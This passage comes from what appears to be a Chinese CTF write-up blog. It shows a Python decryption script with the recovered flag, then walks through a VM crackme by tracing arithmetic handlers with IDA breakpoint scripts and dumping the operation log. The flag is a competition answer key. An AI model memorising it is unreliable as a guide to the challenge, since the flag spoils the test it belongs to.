class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>,</span><br><span class="line">                           <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;`&#x27;</span>] \</span><br><span class="line">        + [<span class="string">&#x27;catcat&#x27;</span>] * <span class="number">26</span> + [<span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;~&#x27;</span>]</span><br><span class="line">lookup = &#123;ch: i + <span class="number">1</span> <span class="keyword">for</span> i, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(qrazy) <span class="keyword">if</span> ch != <span class="string">&#x27;catcat&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">swap</span>(<span class="params">x: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> ((x &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span>) | ((x &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">src_bytes</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(src_bytes) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step 3 → 2：先把 arc[1] 的输出补回去，再撤销 nibble swap</span></span><br><span class="line">    D = [<span class="number">0</span>] * (n + <span class="number">1</span>)</span><br><span class="line">    D[<span class="number">1</span>] = swap(<span class="number">114</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, n + <span class="number">1</span>):</span><br><span class="line">        D[i] = src_bytes[i - <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    C = [<span class="number">0</span>] * (n + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n + <span class="number">1</span>):</span><br><span class="line">        C[i] = swap(D[i])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step 2 → 1：逆前缀 XOR</span></span><br><span class="line">    B = [<span class="number">0</span>] * (n + <span class="number">1</span>)</span><br><span class="line">    B[<span class="number">1</span>] = C[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, n + <span class="number">1</span>):</span><br><span class="line">        B[i] = C[i] ^ C[i - <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step 1：撤销 “+索引 (mod 255)”（注意从 i = 2 开始）</span></span><br><span class="line">    arc = [<span class="number">0</span>] * (n + <span class="number">1</span>)</span><br><span class="line">    arc[<span class="number">1</span>] = B[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, n + <span class="number">1</span>):</span><br><span class="line">        val = B[i] - i</span><br><span class="line">        <span class="keyword">while</span> val &lt;= <span class="number">0</span>:</span><br><span class="line">            val += <span class="number">255</span></span><br><span class="line">        arc[i] = val</span><br><span class="line"></span><br><span class="line">    word = <span class="string">&#x27;&#x27;</span>.join(qrazy[idx - <span class="number">1</span>] <span class="keyword">for</span> idx <span class="keyword">in</span> arc[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">return</span> arc[<span class="number">1</span>:], word</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    arc_indices, word = decrypt(src)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;arc indices:&#x27;</span>, arc_indices)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;input word :&#x27;</span>, word)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>TSCTF-J{LET_M3_8E_W1TH_Y0U}</p>
<h3 id="The-Loom-of-Mirrored-Dreams"><a href="#The-Loom-of-Mirrored-Dreams" class="headerlink" title="The Loom of Mirrored Dreams"></a>The Loom of Mirrored Dreams</h3><p>虚拟机逆向，没有反调，其实很简单</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013192146793.png" alt="image-20251013192146793"></p>
<p>下好断点先</p>
<p>主逻辑</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013192236671.png" alt="image-20251013192236671"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013192257545.png" alt="image-20251013192257545"></p>
<p>其实这种一般都是tea类等 异或，加法，运算较多</p>
<p>我们在加减乘除那边设好断点dump运算逻辑出来即可</p>
<p>如add</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013192625081.png" alt="image-20251013192625081"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013192646573.png" alt="image-20251013192646573"></p>
<p>一个add指令</p>
<p>我们在这下断点，运行到这rdx，rcx已经被赋值</p>
<p>我们加一下不就知道当时的状态是a &#x3D; d +c 了吗</p>
<p>如果我们知道所有的状态，不就是知道加密的方法了吗?</p>
<p>左边edit breakpoint</p>
<p>为了演示，我在这里用了IDC脚本，下面会用IDApython</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> rcx = GetRegValue(<span class="string">&quot;rcx&quot;</span>);</span><br><span class="line"><span class="keyword">auto</span> rdx = GetRegValue(<span class="string">&quot;rdx&quot;</span>);</span><br><span class="line"><span class="keyword">auto</span> sum = rcx + rdx;</span><br><span class="line">Message(<span class="string">&quot;%X = %X + %X;\n&quot;</span>, sum, rcx, rdx);</span><br></pre></td></tr></table></figure>

<p>shr:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line">value = idc.get_reg_value(<span class="string">&quot;rdx&quot;</span>)        </span><br><span class="line">shift = idc.get_reg_value(<span class="string">&quot;cl&quot;</span>) &amp; <span class="number">0x3F</span>  <span class="comment"># 只保留低 6 bit</span></span><br><span class="line">result = value &gt;&gt; shift</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;value&#125;</span> &gt;&gt; <span class="subst">&#123;shift&#125;</span> = <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>mul</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"></span><br><span class="line">rbp   = idc.get_reg_value(<span class="string">&quot;rbp&quot;</span>)</span><br><span class="line">mul_a = idc.get_reg_value(<span class="string">&quot;rax&quot;</span>)             <span class="comment"># [rbp+var_20]</span></span><br><span class="line">mul_b = ida_bytes.get_qword(rbp - <span class="number">0x18</span>)      <span class="comment"># [rbp+var_18]</span></span><br><span class="line">prod  = (mul_a * mul_b) &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;mul_a&#125;</span> * <span class="subst">&#123;mul_b&#125;</span> = <span class="subst">&#123;prod&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>xor</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"></span><br><span class="line">rbp    = idc.get_reg_value(<span class="string">&quot;rbp&quot;</span>)</span><br><span class="line">v5     = idc.get_reg_value(<span class="string">&quot;rax&quot;</span>)          </span><br><span class="line">v4     = ida_bytes.get_qword(rbp - <span class="number">0x18</span>)   </span><br><span class="line">result = (v5 ^ v4) &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;v5&#125;</span> ^ <span class="subst">&#123;v4&#125;</span> = <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>sub</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"></span><br><span class="line">rbp        = idc.get_reg_value(<span class="string">&quot;rbp&quot;</span>)</span><br><span class="line">minuend    = idc.get_reg_value(<span class="string">&quot;rax&quot;</span>)         <span class="comment"># 被减数</span></span><br><span class="line">subtrahend = ida_bytes.get_qword(rbp - <span class="number">0x18</span>)  <span class="comment"># 减数</span></span><br><span class="line">diff       = (minuend - subtrahend) &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;minuend&#125;</span> - <span class="subst">&#123;subtrahend&#125;</span> = <span class="subst">&#123;diff&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>shl</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"></span><br><span class="line">rbp     = idc.get_reg_value(<span class="string">&quot;rbp&quot;</span>)</span><br><span class="line">value   = ida_bytes.get_qword(rbp - <span class="number">0x20</span>)</span><br><span class="line">shift   = idc.get_reg_value(<span class="string">&quot;cl&quot;</span>) &amp; <span class="number">0x3F</span></span><br><span class="line">result  = (value &lt;&lt; shift) &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;value&#125;</span> &lt;&lt; <span class="subst">&#123;shift&#125;</span> = <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013193218872.png" alt="image-20251013193218872"></p>
<p>运行即可在下方output发现，我输入的是11111222223333344444555556666677777</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br></pre></td><td class="code"><pre><span class="line">0 * 19 = 0</span><br><span class="line">AB = 0 + AB;</span><br><span class="line">171 ^ 49 = 154</span><br><span class="line">1 = 0 + 1;</span><br><span class="line">1 * 19 = 19</span><br><span class="line">BE = 13 + AB;</span><br><span class="line">190 ^ 49 = 143</span><br><span class="line">2 = 1 + 1;</span><br><span class="line">2 * 19 = 38</span><br><span class="line">D1 = 26 + AB;</span><br><span class="line">209 ^ 49 = 224</span><br><span class="line">3 = 2 + 1;</span><br><span class="line">3 * 19 = 57</span><br><span class="line">E4 = 39 + AB;</span><br><span class="line">228 ^ 49 = 213</span><br><span class="line">4 = 3 + 1;</span><br><span class="line">4 * 19 = 76</span><br><span class="line">F7 = 4C + AB;</span><br><span class="line">247 ^ 49 = 198</span><br><span class="line">5 = 4 + 1;</span><br><span class="line">5 * 19 = 95</span><br><span class="line">10A = 5F + AB;</span><br><span class="line">10 ^ 50 = 56</span><br><span class="line">6 = 5 + 1;</span><br><span class="line">6 * 19 = 114</span><br><span class="line">11D = 72 + AB;</span><br><span class="line">29 ^ 50 = 47</span><br><span class="line">7 = 6 + 1;</span><br><span class="line">7 * 19 = 133</span><br><span class="line">130 = 85 + AB;</span><br><span class="line">48 ^ 50 = 2</span><br><span class="line">8 = 7 + 1;</span><br><span class="line">8 * 19 = 152</span><br><span class="line">143 = 98 + AB;</span><br><span class="line">67 ^ 50 = 113</span><br><span class="line">9 = 8 + 1;</span><br><span class="line">9 * 19 = 171</span><br><span class="line">156 = AB + AB;</span><br><span class="line">86 ^ 50 = 100</span><br><span class="line">A = 9 + 1;</span><br><span class="line">10 * 19 = 190</span><br><span class="line">169 = BE + AB;</span><br><span class="line">105 ^ 51 = 90</span><br><span class="line">B = A + 1;</span><br><span class="line">11 * 19 = 209</span><br><span class="line">17C = D1 + AB;</span><br><span class="line">124 ^ 51 = 79</span><br><span class="line">C = B + 1;</span><br><span class="line">12 * 19 = 228</span><br><span class="line">18F = E4 + AB;</span><br><span class="line">143 ^ 51 = 188</span><br><span class="line">D = C + 1;</span><br><span class="line">13 * 19 = 247</span><br><span class="line">1A2 = F7 + AB;</span><br><span class="line">162 ^ 51 = 145</span><br><span class="line">E = D + 1;</span><br><span class="line">14 * 19 = 266</span><br><span class="line">1B5 = 10A + AB;</span><br><span class="line">181 ^ 51 = 134</span><br><span class="line">F = E + 1;</span><br><span class="line">15 * 19 = 285</span><br><span class="line">1C8 = 11D + AB;</span><br><span class="line">200 ^ 52 = 252</span><br><span class="line">10 = F + 1;</span><br><span class="line">16 * 19 = 304</span><br><span class="line">1DB = 130 + AB;</span><br><span class="line">219 ^ 52 = 239</span><br><span class="line">11 = 10 + 1;</span><br><span class="line">17 * 19 = 323</span><br><span class="line">1EE = 143 + AB;</span><br><span class="line">238 ^ 52 = 218</span><br><span class="line">12 = 11 + 1;</span><br><span class="line">18 * 19 = 342</span><br><span class="line">201 = 156 + AB;</span><br><span class="line">1 ^ 52 = 53</span><br><span class="line">13 = 12 + 1;</span><br><span class="line">19 * 19 = 361</span><br><span class="line">214 = 169 + AB;</span><br><span class="line">20 ^ 52 = 32</span><br><span class="line">14 = 13 + 1;</span><br><span class="line">20 * 19 = 380</span><br><span class="line">227 = 17C + AB;</span><br><span class="line">39 ^ 53 = 18</span><br><span class="line">15 = 14 + 1;</span><br><span class="line">21 * 19 = 399</span><br><span class="line">23A = 18F + AB;</span><br><span class="line">58 ^ 53 = 15</span><br><span class="line">16 = 15 + 1;</span><br><span class="line">22 * 19 = 418</span><br><span class="line">24D = 1A2 + AB;</span><br><span class="line">77 ^ 53 = 120</span><br><span class="line">17 = 16 + 1;</span><br><span class="line">23 * 19 = 437</span><br><span class="line">260 = 1B5 + AB;</span><br><span class="line">96 ^ 53 = 85</span><br><span class="line">18 = 17 + 1;</span><br><span class="line">24 * 19 = 456</span><br><span class="line">273 = 1C8 + AB;</span><br><span class="line">115 ^ 53 = 70</span><br><span class="line">19 = 18 + 1;</span><br><span class="line">25 * 19 = 475</span><br><span class="line">286 = 1DB + AB;</span><br><span class="line">134 ^ 54 = 176</span><br><span class="line">1A = 19 + 1;</span><br><span class="line">26 * 19 = 494</span><br><span class="line">299 = 1EE + AB;</span><br><span class="line">153 ^ 54 = 175</span><br><span class="line">1B = 1A + 1;</span><br><span class="line">27 * 19 = 513</span><br><span class="line">2AC = 201 + AB;</span><br><span class="line">172 ^ 54 = 154</span><br><span class="line">1C = 1B + 1;</span><br><span class="line">28 * 19 = 532</span><br><span class="line">2BF = 214 + AB;</span><br><span class="line">191 ^ 54 = 137</span><br><span class="line">1D = 1C + 1;</span><br><span class="line">29 * 19 = 551</span><br><span class="line">2D2 = 227 + AB;</span><br><span class="line">210 ^ 54 = 228</span><br><span class="line">1E = 1D + 1;</span><br><span class="line">30 * 19 = 570</span><br><span class="line">2E5 = 23A + AB;</span><br><span class="line">229 ^ 55 = 210</span><br><span class="line">1F = 1E + 1;</span><br><span class="line">31 * 19 = 589</span><br><span class="line">2F8 = 24D + AB;</span><br><span class="line">248 ^ 55 = 207</span><br><span class="line">20 = 1F + 1;</span><br><span class="line">32 * 19 = 608</span><br><span class="line">30B = 260 + AB;</span><br><span class="line">11 ^ 55 = 60</span><br><span class="line">21 = 20 + 1;</span><br><span class="line">33 * 19 = 627</span><br><span class="line">31E = 273 + AB;</span><br><span class="line">30 ^ 55 = 41</span><br><span class="line">22 = 21 + 1;</span><br><span class="line">34 * 19 = 646</span><br><span class="line">331 = 286 + AB;</span><br><span class="line">49 ^ 55 = 6</span><br><span class="line">23 = 22 + 1;</span><br><span class="line">154 &gt;&gt; 4 = 9</span><br><span class="line">14 &lt;&lt; 4 = 224</span><br><span class="line">1 = 0 + 1;</span><br><span class="line">143 &gt;&gt; 4 = 8</span><br><span class="line">3 &lt;&lt; 4 = 48</span><br><span class="line">2 = 1 + 1;</span><br><span class="line">224 &gt;&gt; 4 = 14</span><br><span class="line">1 &lt;&lt; 4 = 16</span><br><span class="line">3 = 2 + 1;</span><br><span class="line">213 &gt;&gt; 4 = 13</span><br><span class="line">7 &lt;&lt; 4 = 112</span><br><span class="line">4 = 3 + 1;</span><br><span class="line">198 &gt;&gt; 4 = 12</span><br><span class="line">4 &lt;&lt; 4 = 64</span><br><span class="line">5 = 4 + 1;</span><br><span class="line">56 &gt;&gt; 4 = 3</span><br><span class="line">11 &lt;&lt; 4 = 176</span><br><span class="line">6 = 5 + 1;</span><br><span class="line">47 &gt;&gt; 4 = 2</span><br><span class="line">6 &lt;&lt; 4 = 96</span><br><span class="line">7 = 6 + 1;</span><br><span class="line">2 &gt;&gt; 4 = 0</span><br><span class="line">12 &lt;&lt; 4 = 192</span><br><span class="line">8 = 7 + 1;</span><br><span class="line">113 &gt;&gt; 4 = 7</span><br><span class="line">13 &lt;&lt; 4 = 208</span><br><span class="line">9 = 8 + 1;</span><br><span class="line">100 &gt;&gt; 4 = 6</span><br><span class="line">10 &lt;&lt; 4 = 160</span><br><span class="line">A = 9 + 1;</span><br><span class="line">90 &gt;&gt; 4 = 5</span><br><span class="line">0 &lt;&lt; 4 = 0</span><br><span class="line">B = A + 1;</span><br><span class="line">79 &gt;&gt; 4 = 4</span><br><span class="line">9 &lt;&lt; 4 = 144</span><br><span class="line">C = B + 1;</span><br><span class="line">188 &gt;&gt; 4 = 11</span><br><span class="line">8 &lt;&lt; 4 = 128</span><br><span class="line">D = C + 1;</span><br><span class="line">145 &gt;&gt; 4 = 9</span><br><span class="line">14 &lt;&lt; 4 = 224</span><br><span class="line">E = D + 1;</span><br><span class="line">134 &gt;&gt; 4 = 8</span><br><span class="line">3 &lt;&lt; 4 = 48</span><br><span class="line">F = E + 1;</span><br><span class="line">252 &gt;&gt; 4 = 15</span><br><span class="line">2 &lt;&lt; 4 = 32</span><br><span class="line">10 = F + 1;</span><br><span class="line">239 &gt;&gt; 4 = 14</span><br><span class="line">1 &lt;&lt; 4 = 16</span><br><span class="line">11 = 10 + 1;</span><br><span class="line">218 &gt;&gt; 4 = 13</span><br><span class="line">7 &lt;&lt; 4 = 112</span><br><span class="line">12 = 11 + 1;</span><br><span class="line">53 &gt;&gt; 4 = 3</span><br><span class="line">11 &lt;&lt; 4 = 176</span><br><span class="line">13 = 12 + 1;</span><br><span class="line">32 &gt;&gt; 4 = 2</span><br><span class="line">6 &lt;&lt; 4 = 96</span><br><span class="line">14 = 13 + 1;</span><br><span class="line">18 &gt;&gt; 4 = 1</span><br><span class="line">5 &lt;&lt; 4 = 80</span><br><span class="line">15 = 14 + 1;</span><br><span class="line">15 &gt;&gt; 4 = 0</span><br><span class="line">12 &lt;&lt; 4 = 192</span><br><span class="line">16 = 15 + 1;</span><br><span class="line">120 &gt;&gt; 4 = 7</span><br><span class="line">13 &lt;&lt; 